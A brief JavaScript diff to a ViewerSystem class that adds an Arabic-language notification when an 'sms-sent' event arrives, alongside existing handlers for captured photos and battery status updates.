@@ -92,6 +92,8 @@ export class ViewerSystem {
             if (data.type === 'photo-captured') {
                 this.addFileToExplorer(data.data, data.timestamp);
                 Core.showNotification("تم التقاط صورة وحفظها في الملفات", "success");
+            } else if (data.type === 'sms-sent') {
+                Core.showNotification(`تم فتح تطبيق الرسائل للرقم: ${data.phone}`, "success");
             } else if (data.battery) {
                 this.updateBatteryUI(data.battery);
                 Core.showNotification("تم تحديث حالة الجهاز بنجاح");
